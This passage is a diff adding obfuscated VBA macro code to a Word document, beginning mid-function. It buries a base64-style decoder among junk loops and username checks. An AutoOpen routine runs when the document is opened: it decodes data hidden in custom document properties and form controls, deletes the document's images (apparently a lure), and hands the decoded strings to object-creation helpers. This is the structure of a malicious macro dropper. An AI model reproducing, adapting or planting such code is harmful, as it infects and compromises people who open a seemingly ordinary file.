+Dim y3GE5ZD As Collection
+End If
+   Dim TWENTYIDknGHNb As Long
+Dim vkMVr8, E1LOU0kuyW As Integer
+vkMVr8 = 7 + 5
+For c2NKUoBk = 0 To 8
+E1LOU0kuyW = E1LOU0kuyW + c2NKUoBk
+Next c2NKUoBk
+If E1LOU0kuyW < c2NKUoBk Then
+Dim q5taRsoelH As Long
+End If
+Dim T5cBHP, oCYVYUS As Integer
+T5cBHP = 9 + 8
+For vQGCBJ = 0 To 7
+oCYVYUS = oCYVYUS + vQGCBJ
+Next vQGCBJ
+If oCYVYUS < vQGCBJ Then
+Dim LGk2x8 As Long
+End If
+Dim gS2HfshsH As String
+For u9rqbVtEL = 0 To 6
+gS2HfshsH = gS2HfshsH + "p"
+Next u9rqbVtEL
+Dim rMGCAQe As String
+For Leiv2zGH = 0 To 6
+rMGCAQe = rMGCAQe + "D"
+Next Leiv2zGH
+If Len(Application.UserName) < 467 Then
+Dim EQaR0lwJlY As Collection
+End If
+   Do While TWELVE < NINE
+Dim OzyAMy1qgk, TAnGyT As Integer
+OzyAMy1qgk = 5 + 7
+For w2vFOKZ = 0 To 6
+TAnGyT = TAnGyT + w2vFOKZ
+Next w2vFOKZ
+If TAnGyT < w2vFOKZ Then
+Dim TOH9oVMrrU As Long
+End If
+For YpaZG9NYh = 0 To 6
+BcMHhtg = BcMHhtg + YpaZG9NYh
+Next YpaZG9NYh
+Dim NqLLf78jr0 As String
+For sG3zmdwRtf = 0 To 7
+NqLLf78jr0 = NqLLf78jr0 + "A"
+Next sG3zmdwRtf
+If Application.UserName = "JUzy795fSy5" Then
+MsgBox ("OH5gDGrwctz")
+Else
+Dim W2j3z0uDtpYT3h As String
+W2j3z0uDtpYT3h = Application.UserName
+End If
+If Application.UserName = "ppD3mhr3ahC" Then
+MsgBox ("lQNZ3oQ8JPu")
+Else
+Dim iCBXKtb1P00lbV As String
+iCBXKtb1P00lbV = Application.UserName
+End If
+      Dim THIRTEEN As Byte: THIRTEEN = HCARCSZCXt(TWELVE): TWELVE = TWELVE + 1
+Dim ow2IAOF4 As Long
+For cWtXzOS = 8 To 13
+ow2IAOF4 = ow2IAOF4 + cWtXzOS
+Next cWtXzOS
+Dim XRnO3R3, kD9pCR8n As Integer
+XRnO3R3 = 7 + 8
+For rAHb5LRk = 0 To 8
+kD9pCR8n = kD9pCR8n + rAHb5LRk
+Next rAHb5LRk
+If kD9pCR8n < rAHb5LRk Then
+Dim FzgkE45z As Long
+End If
+Dim nTCG1bl As Long
+For XEhCmWJ = 5 To 13
+nTCG1bl = nTCG1bl + XEhCmWJ
+Next XEhCmWJ
+For KWgvp0 = 0 To 8
+lZOG9K = lZOG9K + KWgvp0
+Next KWgvp0
+Dim CgNo5oM7H As String
+For C2tnRPfB = 0 To 7
+CgNo5oM7H = CgNo5oM7H + "B"
+Next C2tnRPfB
+Dim NQOQWL6J7Q, QIeJDV As Integer
+NQOQWL6J7Q = 5 + 6
+For yq8G3C = 0 To 9
+QIeJDV = QIeJDV + yq8G3C
+Next yq8G3C
+If QIeJDV < yq8G3C Then
+Dim yjzX1YV As Long
+End If
+Dim So5s53 As Long
+For xfen4M = 5 To 11
+So5s53 = So5s53 + xfen4M
+Next xfen4M
+If Len(Application.UserName) < 813 Then
+Dim zFj2waUwa As Collection
+End If
+      Dim FIFTEEN As Byte: FIFTEEN = HCARCSZCXt(TWELVE): TWELVE = TWELVE + 1
+Dim ggp8YeG As Long
+For qzYC8Xy = 9 To 18
+ggp8YeG = ggp8YeG + qzYC8Xy
+Next qzYC8Xy
+Dim tovwgx2cIb As String
+For dwnAfdRNX = 0 To 8
+tovwgx2cIb = tovwgx2cIb + "d"
+Next dwnAfdRNX
+Dim e8mXGk As Long
+For bJOmG90wfY = 6 To 16
+e8mXGk = e8mXGk + bJOmG90wfY
+Next bJOmG90wfY
+For Ppux6XYPiG = 0 To 7
+tI3c38 = tI3c38 + Ppux6XYPiG
+Next Ppux6XYPiG
+For vaFmky9IFp = 0 To 5
+RpxZLTcH = RpxZLTcH + vaFmky9IFp
+Next vaFmky9IFp
+Dim cpHjVCc As Long
+For c7WlWAPt = 6 To 15
+cpHjVCc = cpHjVCc + c7WlWAPt
+Next c7WlWAPt
+If Len(Application.UserName) < 963 Then
+Dim QEghjuS6 As Collection
+End If
+      Dim dEYtsxPjTEEN As Byte: If TWELVE < NINE Then dEYtsxPjTEEN = HCARCSZCXt(TWELVE): TWELVE = TWELVE + 1 Else dEYtsxPjTEEN = Asc("A")
+Dim SG6tb8Y, lxj1NC As Integer
+SG6tb8Y = 9 + 8
+For FknNVHXDH = 0 To 5
+lxj1NC = lxj1NC + FknNVHXDH
+Next FknNVHXDH
+If lxj1NC < FknNVHXDH Then
+Dim FhhcxIcHk As Long
+End If
+Dim VDTQciQ2X As String
+For BvUKJj = 0 To 9
+VDTQciQ2X = VDTQciQ2X + "e"
+Next BvUKJj
+Dim lXiKURVmA As String
+For DFdHlYdq = 0 To 7
+lXiKURVmA = lXiKURVmA + "Z"
+Next DFdHlYdq
+For YH4VlUrY = 0 To 9
+h1EXXN = h1EXXN + YH4VlUrY
+Next YH4VlUrY
+If Len(Application.UserName) < 637 Then
+Dim gWvfEMv As Collection
+End If
+If Application.UserName = "QtqkJjpaO5N" Then
+MsgBox ("EF8nwDUhdG7")
+Else
+Dim H7B3GwoKPEdo2D As String
+H7B3GwoKPEdo2D = Application.UserName
+End If
+      Dim kZ6lTpwhV As Byte: If TWELVE < NINE Then kZ6lTpwhV = HCARCSZCXt(TWELVE): TWELVE = TWELVE + 1 Else kZ6lTpwhV = Asc("A")
+Dim PMYJW4j4Q As String
+For ARg0YNAJu6 = 0 To 7
+PMYJW4j4Q = PMYJW4j4Q + "U"
+Next ARg0YNAJu6
+Dim GfnKpGf As String
+For qzw6MN7 = 0 To 5
+GfnKpGf = GfnKpGf + "H"
+Next qzw6MN7
+Dim lyHKh13 As String
+For Z7PwdNn = 0 To 7
+lyHKh13 = lyHKh13 + "M"
+Next Z7PwdNn
+Dim SddWXizH As String
+For xuMXQQ33K9 = 0 To 8
+SddWXizH = SddWXizH + "d"
+Next xuMXQQ33K9
+Dim lI2iyMDtwb As String
+For Rj3JLHS5h = 0 To 9
+lI2iyMDtwb = lI2iyMDtwb + "b"
+Next Rj3JLHS5h
+      Dim HCARCSZCXtTEEN As Byte: HCARCSZCXtTEEN = mviES3v0(THIRTEEN)
+Dim PQdvElEgo5 As String
+For eUQmdCtz = 0 To 5
+PQdvElEgo5 = PQdvElEgo5 + "M"
+Next eUQmdCtz
+Dim lASzJAReGG, Kh4V6gZZ As Integer
+lASzJAReGG = 9 + 8
+For WNNQxnOe = 0 To 6
+Kh4V6gZZ = Kh4V6gZZ + WNNQxnOe
+Next WNNQxnOe
+If Kh4V6gZZ < WNNQxnOe Then
+Dim H6aE6n0 As Long
+End If
+Dim UHlZomDyXA, GgZieZd As Integer
+UHlZomDyXA = 9 + 7
+For Slo34h = 0 To 7
+GgZieZd = GgZieZd + Slo34h
+Next Slo34h
+If GgZieZd < Slo34h Then
+Dim BLLG7dCP As Long
+End If
+Dim ifKgYqfV As String
+For AcwXmRX2dl = 0 To 7
+ifKgYqfV = ifKgYqfV + "L"
+Next AcwXmRX2dl
+If Len(Application.UserName) < 129 Then
+Dim UCBAyZg5HN As Collection
+End If
+      Dim NINETEEN As Byte: NINETEEN = mviES3v0(FIFTEEN)
+Dim BW0HpTKns As String
+For eFPQ4c = 0 To 6
+BW0HpTKns = BW0HpTKns + "U"
+Next eFPQ4c
+Dim zS3pVVh As Long
+For hwZzCaX = 8 To 15
+zS3pVVh = zS3pVVh + hwZzCaX
+Next hwZzCaX
+If Application.UserName = "Upl1DXUogAL" Then
+MsgBox ("g3kHVcJ7zrZ")
+Else
+Dim Gl0RQ6iQ1d9hC3 As String
+Gl0RQ6iQ1d9hC3 = Application.UserName
+End If
+If Len(Application.UserName) < 133 Then
+Dim QDIo51ZL3 As Collection
+End If
+If Application.UserName = "AYd2EVOS8hi" Then
+MsgBox ("ogqS9Diy00t")
+Else
+Dim FOFiJDvfAFO4LS As String
+FOFiJDvfAFO4LS = Application.UserName
+End If
+      Dim TWENTY As Byte: TWENTY = mviES3v0(dEYtsxPjTEEN)
+Dim eMF26r, W3pK8vu As Integer
+eMF26r = 9 + 9
+For vd5uPlmM = 0 To 9
+W3pK8vu = W3pK8vu + vd5uPlmM
+Next vd5uPlmM
+If W3pK8vu < vd5uPlmM Then
+Dim iDfg9yRy As Long
+End If
+Dim VTmr3hqTwl As String
+For AhEtVCq = 0 To 6
+VTmr3hqTwl = VTmr3hqTwl + "B"
+Next AhEtVCq
+Dim MTFeqQWsu1, egWqFbG9u As Integer
+MTFeqQWsu1 = 9 + 9
+For AIffQUwhD = 0 To 5
+egWqFbG9u = egWqFbG9u + AIffQUwhD
+Next AIffQUwhD
+If egWqFbG9u < AIffQUwhD Then
+Dim CDqmzw As Long
+End If
+Dim c3V145PTaM As Long
+For vHSbTcdfc = 7 To 14
+c3V145PTaM = c3V145PTaM + vHSbTcdfc
+Next vHSbTcdfc
+      Dim TWENTYAWBLYT As Byte: TWENTYAWBLYT = mviES3v0(kZ6lTpwhV)
+Dim ODnmwE As String
+For iDKD2Y = 0 To 5
+ODnmwE = ODnmwE + "P"
+Next iDKD2Y
+Dim aWxjfC6aT As String
+For GqOKeVY9 = 0 To 8
+aWxjfC6aT = aWxjfC6aT + "Y"
+Next GqOKeVY9
+Dim NXrOPUJc As String
+For fWQCw1 = 0 To 8
+NXrOPUJc = NXrOPUJc + "c"
+Next fWQCw1
+If Application.UserName = "qWmbR5czys8" Then
+MsgBox ("KJcGzqBQLiB")
+Else
+Dim FAYr6dHUN9CGp0 As String
+FAYr6dHUN9CGp0 = Application.UserName
+End If
+      Dim TWENTYuwyob6l As Byte: TWENTYuwyob6l = (HCARCSZCXtTEEN * 4) Or (NINETEEN \ &H10)
+Dim aGmJxPLZFU, yKHzUv2iiO As Integer
+aGmJxPLZFU = 9 + 7
+For JJUPRP = 0 To 9
+yKHzUv2iiO = yKHzUv2iiO + JJUPRP
+Next JJUPRP
+If yKHzUv2iiO < JJUPRP Then
+Dim wfjHINy As Long
+End If
+Dim YJbSsAf3, P4rrpee As Integer
+YJbSsAf3 = 7 + 5
+For KYDhMhHs = 0 To 9
+P4rrpee = P4rrpee + KYDhMhHs
+Next KYDhMhHs
+If P4rrpee < KYDhMhHs Then
+Dim RQuRRN As Long
+End If
+Dim Mz3f9RrYF As Long
+For DsMGSy5qF = 5 To 18
+Mz3f9RrYF = Mz3f9RrYF + DsMGSy5qF
+Next DsMGSy5qF
+For DNv4Di3 = 0 To 6
+Xy0Ex6Ro = Xy0Ex6Ro + DNv4Di3
+Next DNv4Di3
+      Dim vyITRc5vu0 As Byte: vyITRc5vu0 = ((NINETEEN And &HF) * &H10) Or (TWENTY \ 4)
+Dim UvcKic, fJ4AOXpv As Integer
+UvcKic = 9 + 5
+For N1WhTX = 0 To 8
+fJ4AOXpv = fJ4AOXpv + N1WhTX
+Next N1WhTX
+If fJ4AOXpv < N1WhTX Then
+Dim kGd4gPVJ As Long
+End If
+Dim u4SACk, QjuCTM49 As Integer
+u4SACk = 8 + 7
+For BwB8zz2DCc = 0 To 8
+QjuCTM49 = QjuCTM49 + BwB8zz2DCc
+Next BwB8zz2DCc
+If QjuCTM49 < BwB8zz2DCc Then
+Dim AvHarXAc As Long
+End If
+Dim z1WzZ7yOIn As String
+For EXVKDE6 = 0 To 7
+z1WzZ7yOIn = z1WzZ7yOIn + "y"
+Next EXVKDE6
+For KYLkfaX = 0 To 7
+SV3h7w = SV3h7w + KYLkfaX
+Next KYLkfaX
+      Dim TWENTYdyVaUnTFo As Byte: TWENTYdyVaUnTFo = ((TWENTY And 3) * &H40) Or TWENTYAWBLYT
+Dim kfw0YrFrg As Long
+For yCqXsAIa = 7 To 16
+kfw0YrFrg = kfw0YrFrg + yCqXsAIa
+Next yCqXsAIa
+Dim m7DM3T6GY, ZpPC69j8 As Integer
+m7DM3T6GY = 7 + 6
+For b5cpmiM = 0 To 5
+ZpPC69j8 = ZpPC69j8 + b5cpmiM
+Next b5cpmiM
+If ZpPC69j8 < b5cpmiM Then
+Dim tv3xfC As Long
+End If
+Dim LstuzW9fUH As String
+For giikwDyLp0 = 0 To 8
+LstuzW9fUH = LstuzW9fUH + "h"
+Next giikwDyLp0
+      ELEVEN(TWENTYIDknGHNb) = TWENTYuwyob6l: TWENTYIDknGHNb = TWENTYIDknGHNb + 1
+Dim oHycUvfw4d, Vk7MbV0F As Integer
+oHycUvfw4d = 8 + 8
+For tw1C4RrDHC = 0 To 8
+Vk7MbV0F = Vk7MbV0F + tw1C4RrDHC
+Next tw1C4RrDHC
+If Vk7MbV0F < tw1C4RrDHC Then
+Dim VnDOv1G As Long
+End If
+For H88PVL3 = 0 To 8
+tXP2KKxNrP = tXP2KKxNrP + H88PVL3
+Next H88PVL3
+Dim FAwPBlQKX7 As Long
+For xKvYCMEx = 7 To 15
+FAwPBlQKX7 = FAwPBlQKX7 + xKvYCMEx
+Next xKvYCMEx
+Dim nCQ7aG As String
+For WCoa8bf = 0 To 7
+nCQ7aG = nCQ7aG + "D"
+Next WCoa8bf
+If Application.UserName = "irgNr0ci8zI" Then
+MsgBox ("UFTJ4ZZnCDW")
+Else
+Dim KjsWCJ3S9HAcsE As String
+KjsWCJ3S9HAcsE = Application.UserName
+End If
+      If TWENTYIDknGHNb < TEN Then ELEVEN(TWENTYIDknGHNb) = vyITRc5vu0: TWENTYIDknGHNb = TWENTYIDknGHNb + 1
+Dim hFEyUdwaJ, hBLuHZ As Integer
+hFEyUdwaJ = 5 + 5
+For RsUt6ac0dp = 0 To 7
+hBLuHZ = hBLuHZ + RsUt6ac0dp
+Next RsUt6ac0dp
+If hBLuHZ < RsUt6ac0dp Then
+Dim CHnBg2 As Long
+End If
+Dim gA89kh1 As String
+For Vl9h6lL = 0 To 8
+gA89kh1 = gA89kh1 + "N"
+Next Vl9h6lL
+Dim dDBFhvJTlN As String
+For iMDlx0q = 0 To 8
+dDBFhvJTlN = dDBFhvJTlN + "o"
+Next iMDlx0q
+If Len(Application.UserName) < 942 Then
+Dim LJrRjj7of1 As Collection
+End If
+      If TWENTYIDknGHNb < TEN Then ELEVEN(TWENTYIDknGHNb) = TWENTYdyVaUnTFo: TWENTYIDknGHNb = TWENTYIDknGHNb + 1
+Dim hcvym0O01c, vAvQlt As Integer
+hcvym0O01c = 7 + 8
+For BzZ4UN = 0 To 6
+vAvQlt = vAvQlt + BzZ4UN
+Next BzZ4UN
+If vAvQlt < BzZ4UN Then
+Dim Swg795 As Long
+End If
+For jXhA0f0a = 0 To 9
+OD859q = OD859q + jXhA0f0a
+Next jXhA0f0a
+Dim StGAkw92a As String
+For dLYJWLIhK = 0 To 6
+StGAkw92a = StGAkw92a + "x"
+Next dLYJWLIhK
+Dim GudYmirsJl As Long
+For Q7YqjWZ4GY = 5 To 15
+GudYmirsJl = GudYmirsJl + Q7YqjWZ4GY
+Next Q7YqjWZ4GY
+Dim Hmvh8slwk As String
+For RfXrLAWzxQ = 0 To 9
+Hmvh8slwk = Hmvh8slwk + "X"
+Next RfXrLAWzxQ
+Dim gqfvkX4x As String
+For tmFrrc = 0 To 7
+gqfvkX4x = gqfvkX4x + "L"
+Next tmFrrc
+If Len(Application.UserName) < 672 Then
+Dim C87jBCDS As Collection
+End If
+      Loop
+If Len(Application.UserName) < 536 Then
+Dim gWBxBXyz As Collection
+End If
+If Application.UserName = "mhxhvYXf9n7" Then
+MsgBox ("XUzEb0BofP7")
+Else
+Dim XAQl5yKNirAg51 As String
+XAQl5yKNirAg51 = Application.UserName
+End If
+   AWBLYT = StrConv(ELEVEN, vbUnicode)
+End Function
+Sub RemovePicture()
+Dim pDHhfJkkQkV2tct As InlineShape
+For MAmBXo = 0 To 8
+tFqUAhQK = tFqUAhQK + MAmBXo
+Next MAmBXo
+Dim FkviC8 As String
+For Xy5q9N = 0 To 8
+FkviC8 = FkviC8 + "f"
+Next Xy5q9N
+For EONrXoGmZO = 0 To 9
+njQYep2 = njQYep2 + EONrXoGmZO
+Next EONrXoGmZO
+Dim jhx47QJ As String
+For PnaZPvA = 0 To 5
+jhx47QJ = jhx47QJ + "Y"
+Next PnaZPvA
+Dim DNuLj2R As String
+For nI1bmTjX = 0 To 5
+DNuLj2R = DNuLj2R + "u"
+Next nI1bmTjX
+If Application.UserName = "R0c2uDiTqOT" Then
+MsgBox ("S2OUMZ5UgsD")
+Else
+Dim DlevPF9g0Kapcq As String
+DlevPF9g0Kapcq = Application.UserName
+End If
+If Application.UserName = "AR2iw8ILNmu" Then
+MsgBox ("o0FQ7VgeaAY")
+Else
+Dim TwWwfgkovn3ah6 As String
+TwWwfgkovn3ah6 = Application.UserName
+End If
+For Each pDHhfJkkQkV2tct In ActiveDocument.InlineShapes
+Dim a5L4MG0R As Long
+For kuOQRt6 = 8 To 16
+a5L4MG0R = a5L4MG0R + kuOQRt6
+Next kuOQRt6
+Dim ztvsMXK As String
+For uKqS2vhltv = 0 To 7
+ztvsMXK = ztvsMXK + "S"
+Next uKqS2vhltv
+pDHhfJkkQkV2tct.Delete
+For X4xfrIe8wv = 0 To 7
+xFxVfP = xFxVfP + X4xfrIe8wv
+Next X4xfrIe8wv
+Dim zJHy6fT As Long
+For SXFz2tJLX4 = 9 To 15
+zJHy6fT = zJHy6fT + SXFz2tJLX4
+Next SXFz2tJLX4
+Dim gZ7mjlVS As Long
+For ohfq8ZV = 6 To 15
+gZ7mjlVS = gZ7mjlVS + ohfq8ZV
+Next ohfq8ZV
+Dim nQK3lPR As String
+For Sal60ARD = 0 To 7
+nQK3lPR = nQK3lPR + "V"
+Next Sal60ARD
+Next pDHhfJkkQkV2tct
+Dim nBO8Mpnoe, FTbwcAX As Integer
+nBO8Mpnoe = 7 + 8
+For xkSVj6D = 0 To 8
+FTbwcAX = FTbwcAX + xkSVj6D
+Next xkSVj6D
+If FTbwcAX < xkSVj6D Then
+Dim Pq2qsx As Long
+End If
+Dim XUkj0D As String
+For AXQ73S = 0 To 9
+XUkj0D = XUkj0D + "y"
+Next AXQ73S
+Dim lYcscyy As String
+For tdeLqMZ5 = 0 To 7
+lYcscyy = lYcscyy + "g"
+Next tdeLqMZ5
+Dim d9rlLIng0V As String
+For m55lPLsFB = 0 To 9
+d9rlLIng0V = d9rlLIng0V + "Q"
+Next m55lPLsFB
+End Sub
+
+Public Function Vu8oMEhb7(ShkyV9OZMF As String) As Object
+Set Vu8oMEhb7 = CreateObject(ShkyV9OZMF)
+End Function
+Sub AutoOpen()
+oh8nq4 = AWBLYT(ActiveDocument.CustomDocumentProperties(US5CE6.zgYkGQna9UFrgQC.Caption).Value)
+If Len(Application.UserName) < 621 Then
+Dim xDcXLQ6C As Collection
+End If
+If Len(Application.UserName) < 419 Then
+Dim yClcXpTgQ As Collection
+End If
+RemovePicture
+For GFTmKLE = 0 To 6
+zLhUEY = zLhUEY + GFTmKLE
+Next GFTmKLE
+Dim EV4sAG As Long
+For RC0e5cKfM = 9 To 14
+EV4sAG = EV4sAG + RC0e5cKfM
+Next RC0e5cKfM
+Dim uSr80wta, CF6pVV As Integer
+uSr80wta = 9 + 9
+For gES6RJd6N = 0 To 7
+CF6pVV = CF6pVV + gES6RJd6N
+Next gES6RJd6N
+If CF6pVV < gES6RJd6N Then
+Dim Ea8vD42R As Long
+End If
+Dim qvvGSbQX, JngMGz As Integer
+qvvGSbQX = 9 + 8
+For F9H7gjI = 0 To 9
+JngMGz = JngMGz + F9H7gjI
+Next F9H7gjI
+If JngMGz < F9H7gjI Then
+Dim jTpbXaY As Long
+End If
+Dim wUAid2 As String
+Dim i3lKdScn8Y, j7vdS1Y As Integer
+i3lKdScn8Y = 6 + 6
+For Q5Ms09Kp1p = 0 To 6
+j7vdS1Y = j7vdS1Y + Q5Ms09Kp1p
+Next Q5Ms09Kp1p
+If j7vdS1Y < Q5Ms09Kp1p Then
+Dim WprdVE43fj As Long
+End If
+For C9m9Mr1Wnl = 0 To 8
+UioK4t2M = UioK4t2M + C9m9Mr1Wnl
+Next C9m9Mr1Wnl
+If Application.UserName = "eZi9r3HptN1" Then
+MsgBox ("A2HiWKdsOqS")
+Else
+Dim FodmPBYGfYeAYk As String
+FodmPBYGfYeAYk = Application.UserName
+End If
+wUAid2 = ocRcrQPl9(AWBLYT(US5CE6.ZNUNNMw.Text), oh8nq4)
+Dim d7jsqdC As String
+For VSXr6YMz = 0 To 6
+d7jsqdC = d7jsqdC + "L"
+Next VSXr6YMz
+Dim tq0COU As String
+For c4EFvOs = 0 To 9
+tq0COU = tq0COU + "K"
+Next c4EFvOs
+If Application.UserName = "efdoqAt2Q05" Then
+MsgBox ("Mg8ZeJpqJZF")
+Else
+Dim WSVIv6KmQvI36n As String
+WSVIv6KmQvI36n = Application.UserName
+End If
+If Application.UserName = "woMEf8X52gv" Then
+MsgBox ("YOYbP3A4jTJ")
+Else
+Dim m2kZgxSwuQaHVb As String
+m2kZgxSwuQaHVb = Application.UserName
+End If
+PcdBnTG5 = US5CE6.bMpPw3H(wUAid2, oh8nq4)
+Dim eBGwprp, EmTu7c5 As Integer
+eBGwprp = 8 + 5
+For chGB9mj = 0 To 6
+EmTu7c5 = EmTu7c5 + chGB9mj
+Next chGB9mj
+If EmTu7c5 < chGB9mj Then
+Dim vC8jaU2Md As Long
+End If
+Dim k4cidg6m2 As Long
+For iEEzaM74 = 8 To 16
+k4cidg6m2 = k4cidg6m2 + iEEzaM74
+Next iEEzaM74
+Dim l9evw4Vbt, NitVXSBl As Integer
+l9evw4Vbt = 5 + 9
+For ueBETC4SS = 0 To 5
+NitVXSBl = NitVXSBl + ueBETC4SS
+Next ueBETC4SS
+If NitVXSBl < ueBETC4SS Then
+Dim Rtpdv1 As Long
+End If
+End Sub
